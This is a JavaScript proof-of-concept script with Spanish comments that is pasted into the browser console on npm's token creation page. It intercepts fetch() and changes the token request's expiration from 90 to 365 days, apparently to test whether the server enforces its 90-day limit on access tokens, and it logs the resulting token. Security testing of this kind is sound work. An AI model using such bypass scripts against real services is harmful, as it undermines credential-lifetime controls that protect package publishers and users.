// ================================================================
// PoC: Bypass de límite 90 días en GAT tokens
// MÉTODO: Interceptar fetch() interno de Spiferack
//
// INSTRUCCIONES:
// 1. Ir a https://www.npmjs.com/settings/{tu-usuario}/tokens/new
// 2. Pegar este script COMPLETO en la consola del navegador
// 3. Llenar el formulario normalmente:
//    - Nombre del token: "test-bypass-365"
//    - Expiration: 90 days (lo que permita la UI)
//    - Permissions: Read and write
//    - Seleccionar paquetes/orgs según necesites
// 4. Hacer click en "Generate Token"
// 5. El script interceptará el request y cambiará expirationDays
// 6. Observar la consola para ver el resultado
// ================================================================

console.log("=== Token Expiration Bypass - Fetch Interceptor ===\n");

// Guardar referencia original
const originalFetch = window.fetch;
let interceptCount = 0;

// Monkey-patch fetch
window.fetch = async function(...args) {
    let [url, options] = args;

    // Detectar POST a endpoint de tokens
    const isTokenEndpoint = typeof url === 'string' &&
        (url.includes('/tokens/new') || url.includes('/tokens/new-gat'));

    const isPost = options && options.method &&
        options.method.toUpperCase() === 'POST';

    if (isTokenEndpoint && isPost && options.body) {
        interceptCount++;
        console.log(`\n[INTERCEPTOR #${interceptCount}] POST detectado a: ${url}`);

        try {
            // Parsear el body
            let body;
            if (typeof options.body === 'string') {
                body = JSON.parse(options.body);
            } else {
                body = options.body;
            }

            console.log(`[ORIGINAL] Body:`, JSON.stringify(body, null, 2));
            console.log(`[ORIGINAL] expirationDays: ${body.expirationDays}`);

            // === MODIFICAR expirationDays ===
            // Cambiar de 90 a 365 (1 año)
            const NUEVO_VALOR = "365";
            const valorOriginal = body.expirationDays;
            body.expirationDays = NUEVO_VALOR;

            console.log(`[MODIFICADO] expirationDays: ${valorOriginal} → ${NUEVO_VALOR}`);
            console.log(`[MODIFICADO] Body completo:`, JSON.stringify(body, null, 2));

            // Reconstruir options con body modificado
            options = {
                ...options,
                body: JSON.stringify(body)
            };

        } catch(e) {
            console.log(`[ERROR] No se pudo parsear/modificar body: ${e.message}`);
            // Continuar con el request original si falla el parse
        }
    }

    // Ejecutar fetch (original o modificado)
    const response = await originalFetch.call(this, url || args[0], options || args[1]);

    // Si era el endpoint de tokens, loguear respuesta
    if (isTokenEndpoint && isPost) {
        // Clonar para poder leer el body sin consumirlo
        const cloned = response.clone();
        try {
            const ct = cloned.headers.get('content-type') || '';
            if (ct.includes('json')) {
                const data = await cloned.json();
                console.log(`\n[RESPUESTA] HTTP ${response.status}`);
                console.log(`[RESPUESTA] Data:`, JSON.stringify(data, null, 2));

                if (data.newToken) {
                    console.log(`\n[!!!] TOKEN CREADO: ${data.newToken}`);
                }
                if (data.error || data.message) {
                    console.log(`\n[!!!] Error/Mensaje: ${data.error || data.message}`);
                }

                // Verificar si el token fue creado con la expiración modificada
                if (response.status === 200 && data.newToken) {
                    console.log(`\n[RESULTADO] Token creado exitosamente con expirationDays=365`);
                    console.log(`[RESULTADO] Verificar en /settings/{user}/tokens si la expiración es ~365 días`);
                } else if (response.status === 200) {
                    console.log(`\n[RESULTADO] HTTP 200 pero sin newToken - verificar respuesta`);
                } else {
                    console.log(`\n[RESULTADO] Servidor respondió HTTP ${response.status} - bypass posiblemente rechazado`);
                }
            } else {
                const text = await cloned.text();
                console.log(`[RESPUESTA] HTTP ${response.status} (no JSON): ${text.substring(0, 500)}`);
            }
        } catch(e) {
            console.log(`[RESPUESTA] Error leyendo respuesta: ${e.message}`);
        }
    }

    return response;
};

console.log("[OK] Interceptor instalado.");
console.log("[OK] Ahora llena el formulario de token normalmente y haz click en 'Generate Token'.");
console.log("[OK] El script cambiará expirationDays de 90 → 365 automáticamente.\n");

// Función para restaurar fetch original
window.restoreFetch = function() {
    window.fetch = originalFetch;
    console.log("[OK] fetch() restaurado al original.");
};

console.log("Para desactivar el interceptor: restoreFetch()");
